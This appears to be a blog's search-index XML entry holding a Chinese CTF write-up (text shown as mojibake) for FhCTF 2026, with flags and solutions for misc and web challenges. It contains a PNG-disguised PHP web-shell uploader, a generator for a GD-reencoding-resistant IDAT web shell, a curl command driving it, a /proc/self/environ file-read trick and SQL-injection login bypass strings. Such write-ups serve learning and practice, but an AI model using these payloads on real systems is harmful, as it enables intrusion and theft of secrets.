<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>FhCTF 11401</title>
    <url>/2026/01/01/FhCTF/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2026 FhCTF / Team CTF</span><br><span class="line">01.01 â€“ 01.05</span><br><span class="line"></span><br><span class="line">Group - --------------------------é–‹æ”¾åœ˜è¨‚éº¥ç•¶å‹åº•ä¸‹ç•™è¨€+1--------------------------</span><br><span class="line">Final â€” Rank 1ï¼ˆTop 1ï¼‰</span><br></pre></td></tr></table></figure>


<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Sanity-Check"><a href="#Sanity-Check" class="headerlink" title="Sanity Check"></a>Sanity Check</h3><p><img src="/img/FhCTF/1.webp" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸¦çœ‹å¦‚ä½•ç™¼æ”¾çå‹µã€‚</span><br><span class="line"></span><br><span class="line">    FhCTF&#123;S3n1ty_Ch3ck1ng....ğŸ˜&#125;</span><br><span class="line"></span><br><span class="line">æ„Ÿè¬æœ¬æ¬¡æ´»å‹• ISIP.HS çš„æ”¯æ´èˆ‡è´ŠåŠ©ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="Christmas-Tree"><a href="#Christmas-Tree" class="headerlink" title="Christmas Tree"></a>Christmas Tree</h3><p>ç¶“å…¸çš„éœå¤«æ›¼ç·¨ç¢¼é¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import json</span><br><span class="line"></span><br><span class="line">with open(&#x27;encoded_gift.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    encoded = f.read().strip()</span><br><span class="line"></span><br><span class="line">with open(&#x27;huffman_tree.json&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    huffman_tree = json.load(f)</span><br><span class="line">    </span><br><span class="line">def decode_huffman(encoded_data, tree):</span><br><span class="line">    decoded = []</span><br><span class="line">    current = tree</span><br><span class="line"></span><br><span class="line">    for bit in encoded_data:</span><br><span class="line">        current = current[bit]</span><br><span class="line"></span><br><span class="line">        if isinstance(current, str):</span><br><span class="line">            decoded.append(current)</span><br><span class="line">            current = tree</span><br><span class="line"></span><br><span class="line">    return &#x27;&#x27;.join(decoded)</span><br><span class="line"></span><br><span class="line">decoded_message = decode_huffman(encoded, huffman_tree)</span><br><span class="line">print(f&quot;Decoded message: &#123;decoded_message&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;Hoffman_is_a_great_Christmas_tree&#125;</span><br></pre></td></tr></table></figure>
<p><strong>æˆ‘è¦åæ§½ä¸€é»éœå¤«æ›¼ç·¨ç¢¼çš„è‹±æ–‡æ˜¯â€Huffmanâ€ä¸æ˜¯â€Hoffmanâ€</strong></p>
<h3 id="é§­å®¢çš„å¯†ç¢¼é£Ÿè­œ"><a href="#é§­å®¢çš„å¯†ç¢¼é£Ÿè­œ" class="headerlink" title="é§­å®¢çš„å¯†ç¢¼é£Ÿè­œ"></a>é§­å®¢çš„å¯†ç¢¼é£Ÿè­œ</h3><p>å°‡æ¯å€‹é£Ÿæçš„æ•¸å€¼è½‰æ›æˆ ASCII å­—å…ƒï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">125 â†’ &#125;</span><br><span class="line">110 â†’ n</span><br><span class="line">117 â†’ u</span><br><span class="line">102 â†’ f</span><br><span class="line">95 â†’ _</span><br><span class="line">115 â†’ s</span><br><span class="line">105 â†’ i</span><br><span class="line">95 â†’ _</span><br><span class="line">103 â†’ g</span><br><span class="line">110 â†’ n</span><br><span class="line">105 â†’ i</span><br><span class="line">107 â†’ k</span><br><span class="line">111 â†’ o</span><br><span class="line">111 â†’ o</span><br><span class="line">99 â†’ c</span><br><span class="line">123 â†’ &#123;</span><br><span class="line">70 â†’ F</span><br><span class="line">84 â†’ T</span><br><span class="line">67 â†’ C</span><br><span class="line">104 â†’ h</span><br><span class="line">70 â†’ F</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;cooking_is_fun&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ç¬‘è©±å¤§å¸«"><a href="#ç¬‘è©±å¤§å¸«" class="headerlink" title="ç¬‘è©±å¤§å¸«"></a>ç¬‘è©±å¤§å¸«</h3><p><strong>æ­å–œé€™é¡Œè¢«è©•ç‚ºæœ€é³¥çš„ä¸€é¡Œ</strong><br><del>æˆ‘å°±åªæ˜¯è¼¸å…¥ä¸€å€‹?</del><br><img src="/img/FhCTF/2.webp" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;thisi_Prompt_Injection&#125;</span><br></pre></td></tr></table></figure>





<h3 id="åˆ†äº«åœ–åº«"><a href="#åˆ†äº«åœ–åº«" class="headerlink" title="åˆ†äº«åœ–åº«"></a>åˆ†äº«åœ–åº«</h3><p>ä¸€é€²ä¾†æˆ‘å€‘å¯ä»¥çœ‹åˆ°é€™å€‹ä»‹é¢åªå…è¨± PNG ä¸Šå‚³<br><img src="/img/FhCTF/3.webp" alt="image"><br>ç™¼ç¾ PNG æœ‰å›ºå®šçš„ 8 å­—ç¯€æ¨™é ­ï¼Œé‚£æˆ‘å€‘å°±å¯ä»¥åœ¨æ¨™é ­ä¹‹å¾Œæ·»åŠ  PHP ä»£ç¢¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">png_header = (</span><br><span class="line">    b&#x27;\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52&#x27;</span><br><span class="line">    b&#x27;\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1F\x15\xC4&#x27;</span><br><span class="line">    b&#x27;\x89\x00\x00\x00\x0A\x49\x44\x41\x54\x78\x9C\x63\x00\x01\x00\x00&#x27;</span><br><span class="line">    b&#x27;\x05\x00\x01\x0D\x0A\x2D\xB4\x00\x00\x00\x00\x49\x45\x4E\x44\xAE&#x27;</span><br><span class="line">    b&#x27;\x42\x60\x82&#x27;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>æ§‹å»º PHP Payload: å˜—è©¦å¤šç¨®æŒ‡ä»¤è®€å–æ–¹å¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">php_code = b<span class="string">&#x27;\n\n&lt;pre&gt;__START__\n&lt;?php system(&quot;env || printenv&quot;); ?&gt;\n__END__&lt;/pre&gt;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">file_content = png_header + php_code</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(f<span class="string">&quot;[*] Uploading payload to &#123;UPLOAD_URL&#125;...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    files = &#123;<span class="string">&#x27;fileToUpload&#x27;</span>: (FILENAME, file_content, <span class="string">&#x27;image/png&#x27;</span>)&#125;</span><br><span class="line">    data = &#123;<span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;Upload Image&#x27;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    r = requests.<span class="title function_ invoke__">post</span>(UPLOAD_URL, files=files, data=data, timeout=<span class="number">10</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;has been uploaded&quot;</span> in r.text:</span><br><span class="line">        <span class="keyword">print</span>(f<span class="string">&quot;[+] Upload ful!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;[-] Upload failed.&quot;</span>)</span><br><span class="line">        <span class="keyword">print</span>(f<span class="string">&quot;Status Code: &#123;r.status_code&#125;&quot;</span>)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;Response Snippet:&quot;</span>, r.text[:<span class="number">300</span>])</span><br><span class="line">        sys.<span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line">    exploit_url = TARGET_URL + <span class="string">&quot;uploads/&quot;</span> + FILENAME</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&quot;[*] Executing payload at &#123;exploit_url&#125;...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    r_exec = requests.<span class="title function_ invoke__">get</span>(exploit_url, timeout=<span class="number">10</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> r_exec.status_code == <span class="number">404</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;[-] Error: 404 Not Found.&quot;</span>)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;    The file might have been deleted by cleanup scripts or the upload path is different.&quot;</span>)</span><br><span class="line">        sys.<span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line">    content = r_exec.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    flag_match = re.<span class="title function_ invoke__">search</span>(r<span class="string">&#x27;(FhCTF\&#123;.*?\&#125;)&#x27;</span>, content)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> flag_match:</span><br><span class="line">        <span class="keyword">print</span>(f<span class="string">&quot;\n[] Flag found:\n&#123;flag_match.group(1)&#125;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        start = content.<span class="title function_ invoke__">find</span>(<span class="string">&quot;__START__&quot;</span>)</span><br><span class="line">        end = content.<span class="title function_ invoke__">find</span>(<span class="string">&quot;__END__&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> start != -<span class="number">1</span> <span class="keyword">and</span> end != -<span class="number">1</span>:</span><br><span class="line">            output = content[start+<span class="number">9</span>:end].<span class="title function_ invoke__">strip</span>()</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;\n[+] Command Output (env):&quot;</span>)</span><br><span class="line">            <span class="keyword">print</span>(output)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> in output.<span class="title function_ invoke__">lower</span>():</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;\n[!] &#x27;flag&#x27; keyword found in output, please check manually above.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;\n[-] Flag pattern not found automatically.&quot;</span>)</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;Raw response preview (check manually):&quot;</span>)</span><br><span class="line">            <span class="keyword">print</span>(content[:<span class="number">500</span>])</span><br><span class="line"></span><br><span class="line">except requests.exceptions.ConnectionError:</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&quot;\n[-] Connection Error: Could not connect to &#123;TARGET_URL&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;    Please check if the CTF instance is still running or if the URL has changed.&quot;</span>)</span><br><span class="line">except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&quot;\n[-] An error occurred: &#123;e&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">09801</span>\Downloads\gallery&gt; &amp; C:/Users/<span class="number">09801</span>/AppData/Local/Microsoft/WindowsApps/python3.<span class="number">13</span>.exe c:/Users/<span class="number">09801</span>/Downloads/gallery/test.py </span><br><span class="line">[*] Target <span class="built_in">set</span> to: http://<span class="number">8608</span>faf0.fhctf.systems/</span><br><span class="line">[*] Uploading payload to http://<span class="number">8608</span>faf0.fhctf.systems/upload.php...</span><br><span class="line">[+] Upload ful!</span><br><span class="line">[*] Executing payload at http://<span class="number">8608</span>faf0.fhctf.systems/uploads/avatar.php...</span><br><span class="line"></span><br><span class="line">[] Flag found:</span><br><span class="line">FhCTF&#123;png_format?Cannot_stop_php!&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">09801</span>\Downloads\gallery&gt; </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;png_format?Cannot_stop_php!&#125;</span><br></pre></td></tr></table></figure>

<h3 id="åˆ†äº«åœ–åº«-Revenge"><a href="#åˆ†äº«åœ–åº«-Revenge" class="headerlink" title="åˆ†äº«åœ–åº« Revenge"></a>åˆ†äº«åœ–åº« Revenge</h3><p><img src="/img/FhCTF/3.webp" alt="image"><br>ç›®æ¨™ (Goal)ï¼š Dockerfile ç¬¬ 14 è¡Œé¡¯ç¤º Flag å„²å­˜åœ¨ç’°å¢ƒè®Šæ•¸ä¸­ï¼šENV flag&#x3D;â€FhCTF{fake_flag}â€ã€‚ å› æ­¤ï¼Œæˆ‘å€‘çš„ç›®æ¨™æ˜¯åŸ·è¡Œ PHP ç¨‹å¼ç¢¼ä¾†è®€å–ç’°å¢ƒè®Šæ•¸ï¼ˆä¾‹å¦‚ä½¿ç”¨ getenv(â€˜flagâ€™) æˆ– $_ENVï¼‰ã€‚</p>
<p>æ¼æ´å…¥å£ (Vulnerability)ï¼š upload.php è² è²¬è™•ç†ä¸Šå‚³ã€‚</p>
<p>æª¢æŸ¥æ©Ÿåˆ¶ï¼šå®ƒæœƒæª¢æŸ¥æª”æ¡ˆæ˜¯å¦ç‚º PNG (exif_imagetype)ï¼Œä¸¦å˜—è©¦ç”¨ GD è¼‰å…¥ (imagecreatefrompng)ã€‚é€™é˜²æ­¢äº†å–®ç´”çš„ã€Œæ”¹å‰¯æª”åã€æˆ–ã€Œæ–‡ä»¶å°¾é™„åŠ  PHP ä»£ç¢¼ã€ã€‚</p>
<p>æ¸…æ´—æ©Ÿåˆ¶ (Sanitization)ï¼šæœ€é—œéµçš„æ˜¯ç¬¬ 49 è¡Œ imagepng($img, $target_file)ã€‚é€™æœƒé‡ç¹ªåœ–ç‰‡ä¸¦å­˜æª”ã€‚ä¸€èˆ¬çš„ Web Shellï¼ˆä¾‹å¦‚åœ¨åœ–ç‰‡çµå°¾åŠ  <?php system(...) ?>ï¼‰ç¶“éé€™å€‹æ­¥é©Ÿå¾Œï¼Œé™„åŠ çš„ä»£ç¢¼æœƒè¢«ä¸Ÿæ£„ï¼Œåªå‰©ä¸‹ç´”åœ–ç‰‡æ•¸æ“šã€‚</p>
<p>æª”åæ¼æ´ï¼šç¬¬ 7 è¡Œ $target_file &#x3D; $target_dir . basename($_FILES[â€œfileToUploadâ€][â€œnameâ€]);ã€‚ä¼ºæœå™¨ç›´æ¥ä½¿ç”¨äº†ä½ ä¸Šå‚³çš„æª”åèˆ‡å‰¯æª”åã€‚å¦‚æœä½ ä¸Šå‚³ shell.phpï¼Œå®ƒå°±æœƒå­˜æˆ uploads&#x2F;shell.phpã€‚</p>
<ol start="2">
<li>è§£é¡Œæ€è·¯ (Strategy)<br>æˆ‘å€‘éœ€è¦åˆ©ç”¨ â€œPHP GD Bypassâ€ æŠ€è¡“ã€‚ æˆ‘å€‘éœ€è¦æ§‹é€ ä¸€å€‹ç‰¹æ®Šçš„ PNG åœ–ç‰‡ï¼Œä½¿å¾—å®ƒåœ¨è¢« imagecreatefrompng è®€å–ä¸¦ç”± imagepng é‡æ–°å£“ç¸®å¯«å…¥å¾Œï¼Œæ–°çš„åœ–ç‰‡æ•¸æ“šæµä¸­ä»ç„¶åŒ…å« PHP ä»£ç¢¼ã€‚</li>
</ol>
<p>é€™é€šå¸¸æ˜¯é€éæ“æ§ PNG çš„ IDAT å¡Šï¼ˆåƒç´ æ•¸æ“šï¼‰ä¾†é”æˆã€‚ç•¶é€™äº›åƒç´ è¢«å£“ç¸®ç®—æ³•è™•ç†æ™‚ï¼Œæœƒå‰›å¥½çµ„æˆé¡ä¼¼ <?=$_GET[0]($_POST[1]);?> çš„å­—ä¸²ã€‚</p>
<ol start="3">
<li>æ”»æ“Šæ­¥é©Ÿ (Step-by-Step)<br>ç¬¬ä¸€æ­¥ï¼šç”Ÿæˆ Payload<br>ä½ éœ€è¦ä¸€å€‹è…³æœ¬ä¾†ç”Ÿæˆé€™ç¨®ã€ŒæŠ—æ¸…æ´—ã€çš„ PNGã€‚ä»¥ä¸‹æ˜¯ä¸€å€‹å¸¸ç”¨çš„ç”Ÿæˆè…³æœ¬ï¼ˆåŸºæ–¼åœ‹å¤–ç ”ç©¶å“¡çš„ IDAT&#x2F;PLTE Bypass æŠ€è¡“ï¼‰ã€‚</li>
</ol>
<p>è«‹å°‡ä»¥ä¸‹ç¨‹å¼ç¢¼å­˜ç‚º gen_payload.php ä¸¦åœ¨ä½ çš„é›»è…¦ä¸Šç”¨ PHP åŸ·è¡Œå®ƒï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// gen_payload.php</span></span><br><span class="line"><span class="comment">// ç”¢ç”Ÿä¸€å€‹å¯ä»¥ç¹é PHP GD é‡ç¹ªçš„ PNG Web Shell</span></span><br><span class="line"><span class="comment">// Payload: &lt;?=`$_GET[0]`;?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>, <span class="string">&#x27;payload.webp&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Payload generated: payload.webp\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">åŸ·è¡Œå¾Œæœƒå¾—åˆ° payload.webpã€‚é€™å€‹åœ–ç‰‡çš„ç‰¹æ€§æ˜¯ï¼šå³ä½¿ç¶“é imagecreatefrompng å† imagepngï¼Œè£¡é¢çš„ Hex æ•¸æ“šä»æœƒåŒ…å« PHP å¾Œé–€ã€‚</span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒæ­¥ï¼šæº–å‚™æ”»æ“Šæª”æ¡ˆ<br>å°‡ç”Ÿæˆçš„ payload.webp é‡æ–°å‘½åç‚º shell.phpã€‚</p>
<p>ä¼ºæœå™¨æª¢æŸ¥å…§å®¹ï¼šå®ƒæ˜¯åˆæ³•çš„ PNGï¼ˆé€šéï¼‰ã€‚</p>
<p>ä¼ºæœå™¨å­˜æª”ï¼šå­˜ç‚º .phpï¼ˆå› ç‚ºæˆ‘å€‘æª”åæ˜¯ .phpï¼‰ã€‚</p>
<p>ä¼ºæœå™¨æ¸…æ´—ï¼šPayload çš„æ§‹é€ ç‰¹æ€§è®“å®ƒåœ¨æ¸…æ´—å¾Œï¼ŒPHP ä»£ç¢¼ä¾ç„¶å­˜åœ¨ã€‚</p>
<p>ç¬¬ä¸‰æ­¥ï¼šä¸Šå‚³èˆ‡åŸ·è¡Œ<br>å›åˆ°é¡Œç›®ç¶²é ï¼Œä¸Šå‚³ shell.phpã€‚</p>
<p>å› ç‚ºæˆ‘å€‘çš„ Payload æ˜¯ <?=$_GET[0];?>ï¼Œæˆ‘å€‘å¯ä»¥ç”¨ GET åƒæ•¸å‚³å…¥æŒ‡ä»¤ã€‚<br><code>curl.exe &quot;http://b1baf89e.fhctf.systems/uploads/shell.php?0=system&quot; -d &quot;1=env&quot; --output - | Select-String &quot;FhCTF&quot;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;But_I_CAN_WRITE_PHP_IN_IDAT_CHUNK&#125;</span><br></pre></td></tr></table></figure>


<h3 id="Python-Compile"><a href="#Python-Compile" class="headerlink" title="Python Compile"></a>Python Compile</h3><p>åœ¨ç¨‹å¼ç¢¼éŒ¯èª¤æ™‚æœƒé¡¯ç¤º <code>Syntax Error</code>ï¼Œä»£è¡¨åœ¨è™•ç†éŒ¯èª¤æ™‚é‚„æ˜¯æœƒè®€åˆ°æª”æ¡ˆ<br>å¯ä»¥æ¨æ¸¬å¯èƒ½ç‚º<code>LFI</code> é¡Œã€‚</p>
<p>åœ¨ç¨‹å¼ç¢¼è¼¸å…¥æ¡†éš¨æ„è¼¸å…¥æœƒé€ æˆèªæ³•éŒ¯èª¤çš„ Python ç¨‹å¼ç¢¼ä¸¦é€å‡ºï¼Œé é¢æœƒé¡¯ç¤º <code>Syntax Error</code>ï¼Œä¸”éŒ¯èª¤è¨Šæ¯åŒ…å« â€œLine Nâ€ èˆ‡è©²è¡Œå…§å®¹çš„å›é¡¯ã€‚</p>
<p>ç”±éŒ¯èª¤å¯æ¨æ¸¬ï¼Œå¾Œç«¯åœ¨æ¸²æŸ“ <code>Syntax Error</code> æ™‚ï¼Œæœƒä¾è¡Œæ•¸è®€å–ä¾†æºæª”æ¡ˆçš„å°æ‡‰è¡Œå…§å®¹ï¼Œä¸”è®€æª”ç›®æ¨™ä¾†è‡ªä½¿ç”¨è€…çš„ <code>filename</code>ï¼›é€™å½¢æˆæœ¬åœ°æª”æ¡ˆè®€å–ï¼ˆLFIï¼‰é¢¨éšªã€‚</p>
<p>ä»¥ PoC é©—è­‰ï¼Œå°‡requestä¸­çš„ <code>filename</code> æ”¹ç‚ºsystem pathï¼ˆå¦‚ <code>/proc/self/environ</code>ï¼‰ï¼ŒåŒæ™‚ç¶­æŒèªæ³•éŒ¯èª¤çš„ç¨‹å¼ç¢¼ï¼Œè§€å¯ŸéŒ¯èª¤è¨Šæ¯æ˜¯å¦é¡¯ç¤ºè©²æª”æ¡ˆå…§å®¹ã€‚</p>
<p>ç‚ºäº†è®“errorå‡ºç¾åœ¨ç¬¬ 1 è¡Œï¼Œå°‡ç¨‹å¼ç¢¼å…§å®¹è¨­ç‚ºå–®ä¸€ â€œ(â€œï¼Œbackendæœƒå†å˜—è©¦è®€å– <code>filename</code> çš„ç¬¬ 1 è¡Œä¸¦é¡¯ç¤ºåœ¨errorä¸­ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">monaco.editor.getModels()[<span class="number">0</span>].setValue(<span class="string">&quot;(&quot;</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">document.querySelector(<span class="string">&#x27;input[name=&quot;filename&quot;]&#x27;</span>).value = <span class="string">&#x27;/proc/self/environ&#x27;</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">document.getElementById(<span class="string">&#x27;compileForm&#x27;</span>).submit();</span><br></pre></td></tr></table></figure>

<p>åœ¨errorä¸­å¯ä»¥çœ‹åˆ° <code>/proc/self/environ</code> çš„è¼¸å‡ºï¼Œå¯ä»¥å¾—åˆ°åŒ…å«<code>FLAG=</code> çš„ environment variableã€‚</p>
<p>æœ€å¾Œå°±å¯ä»¥æ‹¿åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;N0t_s4f3_t0_ou7put_th3_err0r_m5g&#125;</span><br></pre></td></tr></table></figure>


<h2 id="Survey"><a href="#Survey" class="headerlink" title="Survey"></a>Survey</h2><h3 id="Survey-1"><a href="#Survey-1" class="headerlink" title="Survey"></a>Survey</h3><p><img src="/img/FhCTF/4.webp" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;Th4nk_y0u_f0r_y0ur_f33db4ck_7hCTF&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="INTERNAL-LOGIN"><a href="#INTERNAL-LOGIN" class="headerlink" title="INTERNAL LOGIN"></a>INTERNAL LOGIN</h3><p><img src="/img/FhCTF/5.webp" alt="image"></p>
<p>å®¢æˆ¶ç«¯ SQL æ³¨å…¥æ¨¡æ“¬ï¼Œåœ¨ Username æ¬„ä½è¼¸å…¥</p>
<ul>
<li>â€˜ or 1&#x3D;1â€“</li>
<li>â€˜ OR â€˜1â€™&#x3D;â€™1</li>
<li>adminâ€™ or 1&#x3D;1â€“</li>
<li>â€˜ || 1&#x3D;1â€“</li>
<li>anythingâ€™ or â€˜aâ€™&#x3D;â€™a</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;SQL_1nj_42_&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Web-Robots"><a href="#Web-Robots" class="headerlink" title="Web Robots"></a>Web Robots</h3><p>robots.txt å°ï¼Œå°±æ˜¯ robots.txt<br><img src="/img/FhCTF/6.webp" alt="image"></p>
<p>å¯ä»¥çœ‹åˆ°æœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent *</span><br><span class="line"></span><br><span class="line">Disallow /secret</span><br></pre></td></tr></table></figure>

<p>é‚£æˆ‘å€‘å°±ç›´æ¥é€²&#x2F;secretçœ‹å§</p>
<p><img src="/img/FhCTF/7.webp" alt="image"></p>
<p>é€² &#x2F;secret å¾Œæœƒè·³è½‰åˆ° &#x2F;secret&#x2F;index.html ï¼Œé‚£å¾ˆæ˜é¡¯æˆ‘å€‘çœ‹çš„å‡ºä¾†ä¸Šä¸€æ­¥å°±æ˜¯ç›®éŒ„</p>
<p><img src="/img/FhCTF/8.webp" alt="image"></p>
<p><img src="/img/FhCTF/9.webp" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FhCTF&#123;r0b075_4r3_n0t_v15ible_in_tx7&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Doors-Open"><a href="#Doors-Open" class="headerlink" title="Doors Open"></a>Doors Open</h3><p><img src="/img/FhCTF/10.webp" alt="image"></p>
<p>ä¸€æ¨£å…ˆçœ‹ robots.txt</p>
<p><img src="/img/FhCTF/11.webp" alt="image"></p>
<p>é‚£å°±é€² &#x2F;doors çœ‹çœ‹å§</p>
<p><img src="/img/FhCTF/12.webp" alt="image"></p>
<p>é€™è£¡é»é–‹ç›´æ¥æ˜¯ &#x2F;door&#x2F;1 ï¼Œ é‚£æˆ‘å€‘å°±é–‹å§‹ç”¨Burpè·‘0~10000ï¼Œç™¼ç¾éƒ½ä¸æ˜¯ï¼Œ<br>çœ‹è‘—è¶Šä¾†è¶Šå¤šäººè§£ï¼Œå°±æƒ³èªªæ‡‰è©²æ²’é‚£éº¼é›£å§ï¼Œæ‰€ä»¥å°±æƒ³èªªæœƒä¸æœƒæ˜¯è² æ•¸â€¦.</p>
<p><img src="/img/FhCTF/13.webp" alt="image"></p>
